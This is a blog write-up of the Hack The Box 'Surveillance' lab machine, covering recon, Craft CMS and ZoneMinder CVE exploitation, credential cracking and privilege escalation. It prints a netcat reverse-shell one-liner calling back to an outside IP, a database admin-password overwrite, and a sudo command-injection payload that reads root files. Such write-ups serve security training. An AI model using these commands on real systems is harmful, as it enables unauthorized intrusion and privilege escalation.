@@ -1,0 +1,144 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[HTB] Surveillance | Foguh</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: Bender;
+ src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+ font-family: BenderLight;
+ src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('/img/bg.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB] Surveillance</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-12-15T19:08:41.000Z" id="date"> 2023-12-15</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-01-14T21:05:03.000Z" id="updated"> 2024-01-14</time></div></span></div></div><hr><div id="post-content"><div style="display: flex; justify-content: center; align-items: center;">
+
+  <div style="margin-right: 20px;" class='item-img' data-src='surveillance.png'><img src="surveillance.png" title="Surveillance" width="300px" height="300px" style="pointer-events: none;">
+  </div>
+
+  <div style="display: flex; flex-direction: column; text-align: left;">
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">OS: </strong class='item-img' data-src='linux.png'><img src="linux.png" alt="Linux" width="20px" height="20px" style="margin-left: 5px;">
+      <span style="margin-left: 5px;">Linux</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Difficulty:</strong>
+      <span>Medium</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Author:</strong>
+      <span>TheCyberGeek & TRX</span>
+    </div>
+    <div style="display: flex; align-items: center;">
+      <strong style="margin-right: 5px;">Release Date:</strong>
+      <span>December 9, 2023</span>
+    </div>
+  </div>
+
+</div>
+
+
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sC -sV 10.10.11.245 -o nmap_scan<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-14 15:20 WET<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.245<br>Host is up (0.045s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)<br>|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:<span class="hljs-built_in">df</span>:7d:0c:88:d6:ce (ED25519)<br>80/tcp open  http    nginx 1.18.0 (Ubuntu)<br>|_http-title: Did not follow redirect to http://surveillance.htb/<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.09 seconds<br></code></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th align="center">Port</th>
+<th align="center">Service</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">22</td>
+<td align="center">SSH</td>
+</tr>
+<tr>
+<td align="center">80</td>
+<td align="center">HTTP</td>
+</tr>
+</tbody></table>
+<h3 id="Gobuster"><a href="#Gobuster" class="headerlink" title="Gobuster"></a>Gobuster</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gobuster <span class="hljs-built_in">dir</span> --url http://surveillance.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://surveillance.htb/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index                (Status: 200) [Size: 1]<br>/images               (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/images/]<br>/img                  (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/img/]<br>/admin                (Status: 302) [Size: 0] [--&gt; http://surveillance.htb/admin/login]<br>/css                  (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/css/]<br>/js                   (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/js/]<br>/logout               (Status: 302) [Size: 0] [--&gt; http://surveillance.htb/]<br>/p1                   (Status: 200) [Size: 16230]<br>/fonts                (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/fonts/]<br></code></pre></td></tr></table></figure>
+
+<p>Important directory: &#x2F;admin</p>
+<p class='item-img' data-src='/HTB/Surveillance/adminlogin1.png'><img src="/HTB/Surveillance/adminlogin1.png"></p>
+<h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><h3 id="Shell-as-www-data"><a href="#Shell-as-www-data" class="headerlink" title="Shell as www-data"></a>Shell as www-data</h3><p>Searching for Craft CMS exploit, I found <a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2023-41892/">CVE-2023-41892</a><br>We can get a shell using this <a target="_blank" rel="noopener" href="https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226">PoC</a></p>
+<p>This PoC uses a proxy, we can just enable burp suite’s proxy and forward the request after running the exploit</p>
+<p class='item-img' data-src='/HTB/Surveillance/www-datashell.png'><img src="/HTB/Surveillance/www-datashell.png"><br>After I got the first shell I could not change directories, so I got a new revshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.14.13 1234 &gt;/tmp/f<br></code></pre></td></tr></table></figure>
+
+<h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><p>&#x2F;etc&#x2F;passwd<br class='item-img' data-src='/HTB/Surveillance/passwd.png'><img src="/HTB/Surveillance/passwd.png"></p>
+<h3 id="SQL-Backup-file"><a href="#SQL-Backup-file" class="headerlink" title="SQL Backup file"></a>SQL Backup file</h3><p>In the directory ~&#x2F;html&#x2F;craft&#x2F;storage&#x2F;backups, there is a sql backup zip file<br class='item-img' data-src='/HTB/Surveillance/zipfile.png'><img src="/HTB/Surveillance/zipfile.png"></p>
+<p>We can just transfer the file to our machine<br class='item-img' data-src='/HTB/Surveillance/python3server1.png'><img src="/HTB/Surveillance/python3server1.png"><br class='item-img' data-src='/HTB/Surveillance/zipfiledownload.png'><img src="/HTB/Surveillance/zipfiledownload.png"></p>
+<h3 id="First-credentials"><a href="#First-credentials" class="headerlink" title="First credentials"></a>First credentials</h3><p>After unzipping the file and looking through it, if we search for admin, we get a hashed password for Matthew<br class='item-img' data-src='/HTB/Surveillance/hashmatthew.png'><img src="/HTB/Surveillance/hashmatthew.png"></p>
+<p>Using crackstation we can get Matthew’s password<br class='item-img' data-src='/HTB/Surveillance/matthewpassword.png'><img src="/HTB/Surveillance/matthewpassword.png"></p>
+<h3 id="user-txt-flag"><a href="#user-txt-flag" class="headerlink" title="user.txt flag"></a>user.txt flag</h3><p>Just ssh as matthew with the obtained password and get the user.txt flag<br class='item-img' data-src='/HTB/Surveillance/ssh1.png'><img src="/HTB/Surveillance/ssh1.png"><br class='item-img' data-src='/HTB/Surveillance/userflag.png'><img src="/HTB/Surveillance/userflag.png"></p>
+<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><h3 id="LinPEAS"><a href="#LinPEAS" class="headerlink" title="LinPEAS"></a>LinPEAS</h3><p>Running LinPEAS on the machine, I found more ports being used<br class='item-img' data-src='/HTB/Surveillance/ports.png'><img src="/HTB/Surveillance/ports.png"></p>
+<table>
+<thead>
+<tr>
+<th align="center">Port</th>
+<th align="center">Service</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">53</td>
+<td align="center">DNS</td>
+</tr>
+<tr>
+<td align="center">80</td>
+<td align="center">CraftCMS Page</td>
+</tr>
+<tr>
+<td align="center">22</td>
+<td align="center">SSH</td>
+</tr>
+<tr>
+<td align="center">3306</td>
+<td align="center">SQL</td>
+</tr>
+<tr>
+<td align="center">8080</td>
+<td align="center">Another Web Page?</td>
+</tr>
+</tbody></table>
+<p>Users with console:<br class='item-img' data-src='/HTB/Surveillance/consoleusers.png'><img src="/HTB/Surveillance/consoleusers.png"></p>
+<p>We can also find a database configuration with a password<br class='item-img' data-src='/HTB/Surveillance/zmuserpassword.png'><img src="/HTB/Surveillance/zmuserpassword.png"></p>
+<p>Looking into the database.php file, we can also confirm the username<br class='item-img' data-src='/HTB/Surveillance/databasephp.png'><img src="/HTB/Surveillance/databasephp.png"></p>
+<h3 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h3><p>Since we had found another service running on port 8080, we can portforward this port to our machine through ssh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh matthew@surveillance.htb -L 8080:localhost:8080<br></code></pre></td></tr></table></figure>
+
+<h3 id="ZoneMinder-Login"><a href="#ZoneMinder-Login" class="headerlink" title="ZoneMinder Login"></a>ZoneMinder Login</h3><p>We can see that it is a ZoneMinder login page<br class='item-img' data-src='/HTB/Surveillance/zoneminderlogin.png'><img src="/HTB/Surveillance/zoneminderlogin.png"></p>
+<p>We can use the login we got before to look through the database</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ mysql -h 127.0.0.1 -u zmuser -p<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Surveillance/zmdatabase.png'><img src="/HTB/Surveillance/zmdatabase.png"></p>
+<p>In the users table, we can find the user admin, and it’s hashed password<br class='item-img' data-src='/HTB/Surveillance/userstable1.png'><img src="/HTB/Surveillance/userstable1.png"></p>
+<p>We can just update the password and login with our new provided password<br class='item-img' data-src='/HTB/Surveillance/updatepassword.png'><img src="/HTB/Surveillance/updatepassword.png"><br class='item-img' data-src='/HTB/Surveillance/adminpassword.png'><img src="/HTB/Surveillance/adminpassword.png"></p>
+<p>We can now login in the ZoneMinder page and check the version it is running<br class='item-img' data-src='/HTB/Surveillance/zoneminderversion.png'><img src="/HTB/Surveillance/zoneminderversion.png"></p>
+<h3 id="ZoneMinder-Shell"><a href="#ZoneMinder-Shell" class="headerlink" title="ZoneMinder Shell"></a>ZoneMinder Shell</h3><p>We can use this <a target="_blank" rel="noopener" href="https://github.com/rvizx/CVE-2023-26035">PoC</a> to get a shell as zoneminder<br class='item-img' data-src='/HTB/Surveillance/zoneminderpoc.png'><img src="/HTB/Surveillance/zoneminderpoc.png"><br class='item-img' data-src='/HTB/Surveillance/zonemindershell.png'><img src="/HTB/Surveillance/zonemindershell.png"></p>
+<h3 id="zmupdate-pl"><a href="#zmupdate-pl" class="headerlink" title="zmupdate.pl"></a>zmupdate.pl</h3><p>The user zoneminder can run every file that starts with ‘zm’ and has the .pl extension in the &#x2F;usr&#x2F;bin directory<br class='item-img' data-src='/HTB/Surveillance/sudol.png'><img src="/HTB/Surveillance/sudol.png"></p>
+<p>There are a lot of possible files, but the one with the vulnerability is zmupdate.pl<br class='item-img' data-src='/HTB/Surveillance/lszm.png'><img src="/HTB/Surveillance/lszm.png"></p>
+<p>Looking at zmupdate.pl, which is one of the files we can run as sudo, it runs mysqldump, and then uses the $dbUser variable, we can use this to change the $dbUser variable to whatever command we want to run, and we will get an error for invalid user, but it will show us what was the user we were trying to use.<br>For example, if we set $dbUser to “cat &#x2F;root&#x2F;root.txt” we can expect to get the root flag in the user field</p>
+<p class='item-img' data-src='/HTB/Surveillance/zmupdate.png'><img src="/HTB/Surveillance/zmupdate.png"></p>
+<p>If we try to just run the command without any argument, it will tell us that is is already in the latest version and will not run anything else.<br class='item-img' data-src='/HTB/Surveillance/zmupdateversion.png'><img src="/HTB/Surveillance/zmupdateversion.png"></p>
+<p>So we will need to use the flags -v, -u and -p (version, user and password).</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo /usr/bin/zmupdate.pl -v 1 -u <span class="hljs-string">&#x27;$(cat /root/root.txt)&#x27;</span> -p <span class="hljs-string">&#x27;$(id)&#x27;</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Surveillance/rootflag.png'><img src="/HTB/Surveillance/rootflag.png"></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/HTB/Traverxec/">← Next [HTB] Traverxec</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/HTB/Hospital/">[HTB] Hospital Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/2.png" alt="Logo"></a><h1 id="Dr"><a href="/">Lucas 'Foguh' Ferreira</a></h1><div id="description"><p>Junior PenTester</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gobuster"><span class="toc-number">1.2.</span> <span class="toc-text">Gobuster</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">2.</span> <span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Shell-as-www-data"><span class="toc-number">2.1.</span> <span class="toc-text">Shell as www-data</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement"><span class="toc-number">3.</span> <span class="toc-text">Lateral Movement</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Backup-file"><span class="toc-number">3.1.</span> <span class="toc-text">SQL Backup file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#First-credentials"><span class="toc-number">3.2.</span> <span class="toc-text">First credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-txt-flag"><span class="toc-number">3.3.</span> <span class="toc-text">user.txt flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">4.</span> <span class="toc-text">PrivEsc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LinPEAS"><span class="toc-number">4.1.</span> <span class="toc-text">LinPEAS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Port-Forwarding"><span class="toc-number">4.2.</span> <span class="toc-text">Port Forwarding</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZoneMinder-Login"><span class="toc-number">4.3.</span> <span class="toc-text">ZoneMinder Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZoneMinder-Shell"><span class="toc-number">4.4.</span> <span class="toc-text">ZoneMinder Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zmupdate-pl"><span class="toc-number">4.5.</span> <span class="toc-text">zmupdate.pl</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
